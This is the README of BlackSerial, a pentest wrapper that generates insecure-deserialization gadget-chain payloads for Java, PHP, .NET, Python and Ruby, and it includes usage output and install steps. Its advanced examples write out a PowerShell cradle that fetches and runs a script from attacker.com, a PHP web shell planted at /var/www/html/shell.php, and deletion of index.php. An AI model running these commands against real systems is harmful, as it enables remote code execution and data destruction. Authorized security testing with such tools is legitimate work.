# BlackSerial

![logo](blackserial.png)

BlackSerial is a **Blackbox pentesting Gadget Chain Serializer** for:
* Java ([YSOSerial](https://github.com/frohoff/ysoserial), [Marshalsec](https://github.com/mbechler/marshalsec))
* PHP ([PHPGGC](https://github.com/ambionics/phpggc))
* Python ([Pickle](https://docs.python.org/3/library/pickle.html))
* C#/.Net ([YSOSerial\.Net](https://github.com/pwntester/ysoserial))
* Ruby ([GitHubSecurityLab/ruby-unsafe-deserialization](https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/)).

It is designed to be used during Blackbox pentesting or Bugbounty for 2 use cases:
* you suspect a deserialisation of user input but you don't have the source code to identify or craft a gadget chain
* you have a XML, JSON or YAML input and want to detect deserialization

The main objective is to **identify working gadget chains** on a blackbox code base and **which one worked**, not to make the full RCE exploitation. Thus, it prioritizes out of band interact/collaborator dns callback. Then use directly the detected serializer.

It attempts to generate all possible chains, managing the 🤯 burden of the different chains input formats and tools. You may have experienced it if you tried to write a simple bash script to iterate over all the gadget chains supported by the tool. It outputs the results in a file so it can be used directly in Burp Intruder for instance.

BlackSerial is a python wrapper of different tools. It implements or invents no new technique.

## Features

* Generates around 250 gadget chains with default options and all possible formatters
* Supported serializers: PHPGGC (PHP), YSOSerial (Java), Marshalsec (Java), YSOSerial\.Net (C# .Net), Pickle (Python), Ruby (GitHubSecurityLab/ruby-unsafe-deserialization)
* Out of band execution detection first with DNS callback to `<chain_id>.<interact_domain>`, like `oj-detection-ruby-3.3.ctj7qmhpf81f7c6r97s0js9ea8i9xkjwp.oast.online`
* Can generate payloads by formats for any serializer: `-f [xml|json|yaml]`
* Supported encodings: Base64 `-b`, URL `-u`, Base64 URL safe `-ub`, Hex string `-x`, JSON string `-j`, and any combination like `-b -u`
* Isolates unsafe gadgets with `--unsafe` option: DoS and file deletion
* Can generates all payloads in 1 file and remove line feed `\n` of non binary chains (json, yaml, xml) when put in 1 file
* Can generate 1 file by payload with `-o1` in the format `<chain_name>.txt`. Usefull when you have non binary gadget chains like json, yaml, xml
* Can generates 1 gadget chain only by its name
* Phar output support with optional JPEG polyglot
* Provides 5 custom pickle byte-code (it's not really a chain for pickle, more direct byte-code)

Note: a similar project exists but for ysoserial only and do not work for all payloads: https://github.com/aludermin/ysoserial-wrapper

## Basic examples

List all supported gadget chains:
```
python3 blackserial.py -s all -l

[+] BlackSerial
[!] Defaulting to 'whoami' payload since no interact domain provided
[+] Using serializer ysoserial
[+] Detected java version: 8
[+] Loading available chains
[+] Loaded 34 chains
AspectJWeaver: <remote_file>;<base64>
BeanShell1: <system_command>
C3P0: <url>:<classname>
Click1: <system_command>
Clojure: <system_command>
CommonsBeanutils1: <system_command>
CommonsCollections1: <system_command>
CommonsCollections2: <system_command>
CommonsCollections3: <system_command>
CommonsCollections4: <system_command>
CommonsCollections5: <system_command>
CommonsCollections6: <system_command>
CommonsCollections7: <system_command>
FileUpload1: writeB64;<remote_dir>;<base64> | writeOldB64;<remote_file>;<base64>
Groovy1: <system_command>
Hibernate1: <system_command>
Hibernate2: <system_command>
JBossInterceptors1: <system_command>
JRMPClient: <domain>
JRMPListener: <remote_port>
JSON1: <system_command>
JavassistWeld1: <system_command>
Jdk7u21: <system_command>
Jython1: <local_py_file>;<remote_py_file>
MozillaRhino1: <system_command>
MozillaRhino2: <system_command>
Myfaces1: <system_command>
Myfaces2: <url>:<classname>
ROME: <system_command>
Spring1: <system_command>
Spring2: <system_command>
URLDNS: <url>
Vaadin1: <system_command>
Wicket1: writeB64;<remote_dir>;<base64> | writeOldB64;<remote_file>;<base64>
[+] Using serializer marshalsec
[+] Detected java version: 8
[+] Loading available chains
[+] Loaded 18 chains
BlazeDSAMF0: SpringPropertyPathFactory | C3P0WrapperConnPool
BlazeDSAMF3: UnicastRef | SpringPropertyPathFactory | C3P0WrapperConnPool
BlazeDSAMFX: UnicastRef | SpringPropertyPathFactory | C3P0WrapperConnPool
Hessian: SpringPartiallyComparableAdvisorHolder | SpringAbstractBeanFactoryPointcutAdvisor | Rome | XBean | Resin
Hessian2: SpringPartiallyComparableAdvisorHolder | SpringAbstractBeanFactoryPointcutAdvisor | Rome | XBean | Resin
Burlap: SpringPartiallyComparableAdvisorHolder | SpringAbstractBeanFactoryPointcutAdvisor | Rome | XBean | Resin
Castor: SpringAbstractBeanFactoryPointcutAdvisor | C3P0WrapperConnPool
Jackson: UnicastRemoteObject | SpringPropertyPathFactory | SpringAbstractBeanFactoryPointcutAdvisor | C3P0WrapperConnPool | C3P0RefDataSource | JdbcRowSet | Templates
Java: XBean | CommonsBeanutils
JsonIO: UnicastRef | UnicastRemoteObject | Groovy | SpringAbstractBeanFactoryPointcutAdvisor | Rome | XBean | Resin | LazySearchEnumeration
JYAML: C3P0WrapperConnPool | C3P0RefDataSource | JdbcRowSet
Kryo: SpringAbstractBeanFactoryPointcutAdvisor | CommonsBeanutils
KryoAltStrategy: Groovy | SpringPartiallyComparableAdvisorHolder | SpringAbstractBeanFactoryPointcutAdvisor | Rome | XBean | Resin | LazySearchEnumeration | BindingEnumeration | ServiceLoader | ImageIO | CommonsBeanutils
Red5AMF0: SpringPropertyPathFactory | C3P0WrapperConnPool | JdbcRowSet
Red5AMF3: SpringPropertyPathFactory | C3P0WrapperConnPool | JdbcRowSet
SnakeYAML: UnicastRemoteObject | SpringPropertyPathFactory | SpringAbstractBeanFactoryPointcutAdvisor | XBean | CommonsConfiguration | C3P0WrapperConnPool | C3P0RefDataSource | JdbcRowSet | ScriptEngine | ResourceGadget
XStream: SpringPartiallyComparableAdvisorHolder | SpringAbstractBeanFactoryPointcutAdvisor | Rome | XBean | Resin | CommonsConfiguration | LazySearchEnumeration | BindingEnumeration | ServiceLoader | ImageIO | CommonsBeanutils
YAMLBeans: C3P0WrapperConnPool
[+] Using serializer phpggc
[+] Loading available chains
[+] Loaded 135 chains
Bitrix/RCE1: RCE: Function Call
CakePHP/RCE1: RCE: Command
CakePHP/RCE2: RCE: Function Call
CodeIgniter4/FD1: File delete
CodeIgniter4/FD2: File delete
CodeIgniter4/FR1: File read
CodeIgniter4/RCE1: RCE: Function Call
CodeIgniter4/RCE2: RCE: Function Call
CodeIgniter4/RCE3: RCE: Function Call
CodeIgniter4/RCE4: RCE: Function Call
CodeIgniter4/RCE5: RCE: Function Call
CodeIgniter4/RCE6: RCE: Function Call
Doctrine/FW2: File write
Doctrine/RCE1: RCE: PHP Code
Doctrine/RCE2: RCE: Function Call
Dompdf/FD1: File delete
Dompdf/FD2: File delete
Drupal7/FD1: File delete
Drupal7/RCE1: RCE: Function Call
Drupal9/RCE1: RCE: Function Call
Guzzle/FW1: File write
Guzzle/INFO1: phpinfo()
Guzzle/RCE1: RCE: Function Call
Horde/RCE1: RCE: PHP Code
Kohana/FR1: File read
Laminas/FD1: File delete
Laminas/FW1: File write
Laravel/RCE1: RCE: Function Call
Laravel/RCE2: RCE: Function Call
Laravel/RCE3: RCE: Function Call
Laravel/RCE4: RCE: Function Call
Laravel/RCE5: RCE: PHP Code
Laravel/RCE6: RCE: PHP Code
Laravel/RCE7: RCE: Function Call
Laravel/RCE8: RCE: Function Call
Laravel/RCE9: RCE: Function Call
Laravel/RCE10: RCE: Function Call
Laravel/RCE11: RCE: Function Call
Laravel/RCE12: RCE: Function Call
Laravel/RCE13: RCE: Function Call
Laravel/RCE14: RCE: Function Call
Laravel/RCE15: RCE: Function Call
Laravel/RCE16: RCE: Function Call
Laravel/RCE17: RCE: Function Call
Laravel/RCE18: RCE: PHP Code
Laravel/RCE19: RCE: Command
Laravel/RCE20: RCE: Function Call
Laravel/RCE21: RCE: Function Call
Magento/FW1: File write
Magento/SQLI1: SQL injection
Monolog/FW1: File write
Monolog/RCE1: RCE: Function Call
Monolog/RCE2: RCE: Function Call
Monolog/RCE3: RCE: Function Call
Monolog/RCE4: RCE: Command
Monolog/RCE5: RCE: Function Call
Monolog/RCE6: RCE: Function Call
Monolog/RCE7: RCE: Function Call
Monolog/RCE8: RCE: Function Call
Monolog/RCE9: RCE: Function Call
Phalcon/RCE1: RCE: eval(php://input)
Phing/FD1: File delete
PHPCSFixer/FD1: File delete
PHPCSFixer/FD2: File delete
PHPExcel/FD1: File delete
PHPExcel/FD2: File delete
PHPExcel/FD3: File delete
PHPExcel/FD4: File delete
PHPSecLib/RCE1: RCE: PHP Code
Pydio/Guzzle/RCE1: RCE: Function Call
Slim/RCE1: RCE: Function Call
Spiral/RCE1: RCE: Function Call
Spiral/RCE2: RCE: Function Call
SwiftMailer/FD1: File delete
SwiftMailer/FD2: File delete
SwiftMailer/FR1: File read
SwiftMailer/FW1: File write
SwiftMailer/FW2: File write
SwiftMailer/FW3: File write
SwiftMailer/FW4: File write
Symfony/FD1: File delete
Symfony/FW1: File write
Symfony/FW2: File write
Symfony/RCE1: RCE: Command
Symfony/RCE2: RCE: PHP Code
Symfony/RCE3: RCE: PHP Code
Symfony/RCE4: RCE: Function Call
Symfony/RCE5: RCE: Function Call
Symfony/RCE6: RCE: Command
Symfony/RCE7: RCE: Function Call
Symfony/RCE8: RCE: Function Call
Symfony/RCE9: RCE: Function Call
Symfony/RCE10: RCE: Function Call
Symfony/RCE11: RCE: Function Call
Symfony/RCE12: RCE: Function Call
Symfony/RCE13: RCE: Function Call
Symfony/RCE14: RCE: Function Call
Symfony/RCE15: RCE: Function Call
Symfony/RCE16: RCE: Function Call
TCPDF/FD1: File delete
ThinkPHP/FW1: File write
ThinkPHP/FW2: File write
ThinkPHP/RCE1: RCE: Function Call
ThinkPHP/RCE2: RCE: Function Call
ThinkPHP/RCE3: RCE: Function Call
ThinkPHP/RCE4: RCE: Function Call
Typo3/FD1: File delete
vBulletin/RCE1: RCE: Function Call
WordPress/Dompdf/RCE1: RCE: Function Call
WordPress/Dompdf/RCE2: RCE: Function Call
WordPress/Guzzle/RCE1: RCE: Function Call
WordPress/Guzzle/RCE2: RCE: Function Call
WordPress/P/EmailSubscribers/RCE1: RCE: Function Call
WordPress/P/EverestForms/RCE1: RCE: Function Call
WordPress/P/WooCommerce/RCE1: RCE: Function Call
WordPress/P/WooCommerce/RCE2: RCE: Function Call
WordPress/P/YetAnotherStarsRating/RCE1: RCE: Function Call
WordPress/PHPExcel/RCE1: RCE: Function Call
WordPress/PHPExcel/RCE2: RCE: Function Call
WordPress/PHPExcel/RCE3: RCE: Function Call
WordPress/PHPExcel/RCE4: RCE: Function Call
WordPress/PHPExcel/RCE5: RCE: Function Call
WordPress/PHPExcel/RCE6: RCE: Function Call
WordPress/RCE1: RCE: Function Call
WordPress/RCE2: RCE: Function Call
Yii/RCE1: RCE: Function Call
Yii/RCE2: RCE: Function Call
Yii2/RCE1: RCE: Function Call
Yii2/RCE2: RCE: PHP Code
ZendFramework/FD1: File delete
ZendFramework/RCE1: RCE: PHP Code
ZendFramework/RCE2: RCE: Function Call
ZendFramework/RCE3: RCE: Function Call
ZendFramework/RCE4: RCE: PHP Code
ZendFramework/RCE5: RCE: Function Call
[+] Using serializer pickle
[+] Loading available chains
[+] Loaded 6 chains
PickleSystemCommand: <system_command>
PickleCode: <code>
PickleDNS: <domain>
PickleHttpGet: <url>
PickleFileWrite: <remote_file_to_write>;<content>
PickleFileRead: <remote_file_to_read>
[+] Using serializer ysoserial.net
[+] Loading available chains
[+] Loaded 48 chains
ActivitySurrogateDisableTypeCheck: BinaryFormatter | LosFormatter | NetDataContractSerializer | SoapFormatter
ActivitySurrogateSelector: BinaryFormatter | LosFormatter | SoapFormatter
ActivitySurrogateSelectorFromFile: BinaryFormatter | LosFormatter | SoapFormatter
AxHostState: BinaryFormatter | LosFormatter | NetDataContractSerializer | SoapFormatter
BaseActivationFactory: Json.Net
ClaimsIdentity: BinaryFormatter | LosFormatter | SoapFormatter
ClaimsPrincipal: BinaryFormatter | LosFormatter | SoapFormatter
DataSet: BinaryFormatter | LosFormatter | SoapFormatter
DataSetOldBehaviour: BinaryFormatter | LosFormatter
DataSetOldBehaviourFromFile: BinaryFormatter | LosFormatter
DataSetTypeSpoof: BinaryFormatter | LosFormatter | SoapFormatter
GenericPrincipal: BinaryFormatter | LosFormatter
GetterCompilerResults: Json.Net
GetterSecurityException: Json.Net
GetterSettingsPropertyValue: Json.Net | MessagePackTypeless | MessagePackTypelessLz4 | Xaml
ObjectDataProvider: DataContractSerializer | FastJson | FsPickler | JavaScriptSerializer | Json.Net | MessagePackTypeless | MessagePackTypelessLz4 | SharpSerializerBinary | SharpSerializerXml | Xaml | XmlSerializer | YamlDotNet
ObjRef: BinaryFormatter | LosFormatter | ObjectStateFormatter | SoapFormatter
PSObject: BinaryFormatter | LosFormatter | NetDataContractSerializer | SoapFormatter
RolePrincipal: BinaryFormatter | DataContractSerializer | Json.Net | LosFormatter | NetDataContractSerializer | SoapFormatter
SessionSecurityToken: BinaryFormatter | DataContractSerializer | Json.Net | LosFormatter | NetDataContractSerializer | SoapFormatter
SessionViewStateHistoryItem: BinaryFormatter | DataContractSerializer | Json.Net | LosFormatter | NetDataContractSerializer | SoapFormatter
TextFormattingRunProperties: BinaryFormatter | DataContractSerializer | Json.Net | LosFormatter | NetDataContractSerializer | SoapFormatter
ToolboxItemContainer: BinaryFormatter | LosFormatter | SoapFormatter
TypeConfuseDelegate: BinaryFormatter | LosFormatter | NetDataContractSerializer
TypeConfuseDelegateMono: BinaryFormatter | LosFormatter | NetDataContractSerializer
WindowsClaimsIdentity: BinaryFormatter | DataContractSerializer | Json.Net | LosFormatter | NetDataContractSerializer | SoapFormatter
WindowsIdentity: BinaryFormatter | DataContractSerializer | Json.Net | LosFormatter | NetDataContractSerializer | SoapFormatter
WindowsPrincipal: BinaryFormatter | DataContractJsonSerializer | DataContractSerializer | Json.Net | LosFormatter | NetDataContractSerializer | SoapFormatter
XamlAssemblyLoadFromFile: BinaryFormatter | LosFormatter | NetDataContractSerializer | SoapFormatter
XamlImageInfo: Json.Net
ApplicationTrust
DotNetNuke
NetNonRceGadgets/PictureBox: Json.Net | JavaScriptSerializer | Xaml
NetNonRceGadgets/InfiniteProgressPage: Json.Net | JavaScriptSerializer | Xaml
NetNonRceGadgets/FileLogTraceListener: Json.Net | JavaScriptSerializer | Xaml
SessionSecurityTokenHandler
SharePoint
ThirdPartyGadgets/UnmanagedLibrary: Json.Net
ThirdPartyGadgets/WindowsLibrary: Json.Net
ThirdPartyGadgets/Xunit1Executor: Json.Net
ThirdPartyGadgets/GetterActiveMQObjectMessage: Json.Net
ThirdPartyGadgets/PreserveWorkingFolder: Json.Net
ThirdPartyGadgets/OptimisticLockedTextFile: Json.Net
ThirdPartyGadgets/QueryPartitionProvider: Json.Net
ThirdPartyGadgets/FileDiagnosticsTelemetryModule: Json.Net
ThirdPartyGadgets/SingleProcessFileAppender: Json.Net
ThirdPartyGadgets/FileDataStore: Json.Net
TransactionManagerReenlist
[+] Using serializer ruby-unsafe-deserialization
[+] Loading available chains
[+] Loaded 8 chains
marshal-rce-ruby-3.2.4: rce binary
marshal-rce-ruby-3.4-rc: rce binary
oj-detection-ruby-3.3: http-get json
oj-rce-ruby-3.3: rce json
ox-detection-ruby-3.3: http-get xml
ox-rce-ruby-3.3: rce xml
yaml-detection-ruby-3.3: http-get yaml
yaml-rce-ruby-3.3: rce yaml
[+] Listed 249 gadget chains
[+] Happy hunting!
```

Typical usage is the following:
```
python3 blackserial.py -s [java|php|csharp|python|ruby] [-b|-u|-bu|-j] -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com 
```

For example, generates PHP payloads base64 encoded into `payloads.txt` (default output file) with `nslookup <chain_id>.<domain>` system command (default command):
```
python3 blackserial.py -s php -b -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com

[+] BlackSerial
[+] Using serializer phpggc
[+] Loading available chains
[+] Loaded 135 chains
[+] Removing existing payload file payloads.txt
[+] Interact domain: ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
[+] System command: nslookup %%chain_id%%.%%domain%%
[+] PHP Functions: shell_exec
[+] PHP Code: <?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%
[+] File read on server: /etc/hosts
[+] File written on server: ./blackserial.%%ext%%
[+] Content written on server: <?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%
[+] Remote file to delete (if unsafe): index.php
[+] Starting payload generation
[+] [Bitrix/RCE1] Generating payload of type 'RCE: Function Call'
[+] [CakePHP/RCE1] Generating payload of type 'RCE: Command'
[+] [CakePHP/RCE2] Generating payload of type 'RCE: Function Call'
[+] [CodeIgniter4/FR1] Generating payload of type 'File read'
[+] [CodeIgniter4/FR1] Generating payload of type 'File read'
...
[+] [ZendFramework/RCE5] Generating payload of type 'RCE: Function Call'
[+] Generated 118 payloads to payloads.txt
[+] Happy hunting!

```

Then use `payloads.txt` in Bupr Intruser for example.

For manually input XML or JSON payloads in repeater, generates gadgets with 1 file by payload:
```
python3 blackserial.py -s csharp -o1 --output ./payloads-dir/ -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
```

Generate all JSON payloads independantly of the technology for blind deserialization detection:
```
python3 blackserial.py -s all -f json -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
```

⚠️ Do not mistake between `-j` which is just JSON string encoding of a binary output, and `-f json` which is a filter of the gadget which natural output is a JSON payload.

## Advanced examples

Generates Java payloads base64 encoded with powershell cradle for Windows target:
```
python3 blackserial.py -s java -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b -c "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/payload.ps1');\"" -o payloads.txt
```

Generates PHP payloads base64 encoded and then URL encoded and custom read/write files locations:
```
python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b -u -o payloads.txt --remote-content '<?php echo exec($_GET["command"]); ?>' --remote-file-to-write /var/www/html/shell.php --remote-file-to-read /etc/hosts 
```

Generates also unsafe PHP payloads base64 encoded and try to delete `/var/www/html/index.php`:
```
python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b -o payloads.txt --unsafe --remote-file-to-delete /var/www/html/index.php
```

Generates C# payloads with formatter types `Json.Net` and `FastJson` with 1 payload by file:
```
python3 blackserial.py -s csharp -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com --ysoserial-net-formatter Json.Net,FastJson -o1 --output ./payloads-dir/
```

Generates only 1 PHP gadget `WordPress/Dompdf/RCE1` with PHP function `exec`:
```
python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b --php-function exec WordPress/Dompdf/RCE1
```

## Docker install

Build the docker image (go take a long coffee...):
```
docker build --tag=blackserial:latest .
```

Run it: example:
```
docker run -it --rm blackserial:latest -s all -v -i domain.fr
```

## Automated local install

Launch the following script locally. Warning: this will install wine and mono which requires space:
```
./install.sh
```

Offline installation of dependencies are provided in the `./archives` directory. Git repository are not provided.

## Manual local install

### phpggc

Install php:
```
sudo apt install php
```

Clone repository:
```
cd bin
git clone https://github.com/ambionics/phpggc
```

### ysoserial

Install JRE8 in a local directory:
```
cd bin
wget "https://javadl.oracle.com/webapps/download/AutoDL?BundleId=251398_0d8f12bc927a4e2c9f8568ca567db4ee" -O jre-8u431-linux-x64.tar.gz
tar -xzf jre-8u431-linux-x64.tar.gz
```

Download last release from officiel repo: https://github.com/frohoff/ysoserial/releases
```
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```

Put `ysoserial-all.jar` in the `bin` directory


### marshalsec

Install JRE8 in a local directory (see ysoserial manual install)

Install maven

Clone repository and build it:
```
cd bin
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
```

Test it:
```
java -cp target/marshalsec-[VERSION]-SNAPSHOT-all.jar marshalsec.Java
```

Put `target/marshalsec-[VERSION]-SNAPSHOT-all.jar` in the `bin` directory

### ysoserial

Install JRE8 in a local directory:
```
cd bin
wget "https://javadl.oracle.com/webapps/download/AutoDL?BundleId=251398_0d8f12bc927a4e2c9f8568ca567db4ee" -O jre-8u431-linux-x64.tar.gz
tar -xzf jre-8u431-linux-x64.tar.gz
```

Clone repository and build it:
```
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
cp ./target/marshalsec-all.jar ../
```

Test it:
```
../bin/jre1.8.0_431/bin/java -cp ./target/marshalsec-all.jar  marshalsec.Java
```

## pickle

Just install python pickle module:
```
pip3 install pickledb
```

### ysoserial\.net

Under debian linux, use wine:
```
sudo apt update 
sudo dpkg --add-architecture i386
sudo apt install --install-recommends mono-complete wine winetricks
winetricks dotnet48
winetricks nocrashdialog
```

Download last release from officiel repo: https://github.com/pwntester/ysoserial.net/releases

Unzip it in `bin` directory.

Make a unit test to see if everything is ok:
```
wine ./bin/Release/ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"
```

### ruby

Install ruby:
```
sudo apt install ruby
```

Clone repository:
```
cd bin
git clone https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/
```

## FAQ / known issues

## Why install another JRE? I have already one installed

Lots of ysoserial payloads need at least JRE 11 and some JRE 8. It is better to download a local JVM to generate them correctly. You can still use your JVM with the option `--java-path`

## Why ysoserial\.net generation is so slow?

Under linux, blackserial uses wine to launch ysoserial.exe and thus it is slow. It may be quicker under Windows.

## Why some ysoserial\.net plugins are not supported?

I chose only plugins that are autonomous and do not require extra information. Viewstate plugin requires encryption key for instance and is excluded.

## Some gadgets fail to generate

* ysoserial\.net: ActivitySurrogateDisableTypeCheck
* ysoserial\.net: PSObject 
* ysoserial\.net: ObjRef with formatter 'ObjectStateFormatter'
* ysoserial\.net: TypeConfuseDelegateMono
* ysoserial\.net: XamlAssemblyLoadFromFile with formatter 'SoapFormatter'
* phpggc: Symfony/RCE14 ([PR opened](https://github.com/ambionics/phpggc/pull/204))
* marshalsec: ServiceLoader ([Issue opened](https://github.com/mbechler/marshalsec/issues/44))

## TODO

* resx file generation support
* output format filter: xml, json, yaml, binary


## ⚠️ WARNING: LEGAL DISCLAIMER

This tool is intended for **educational and ethical use only**. The author is not liable for any illegal use or misuse of this tool. Users are solely responsible for their actions and must ensure they have explicit permission to scan the target systems.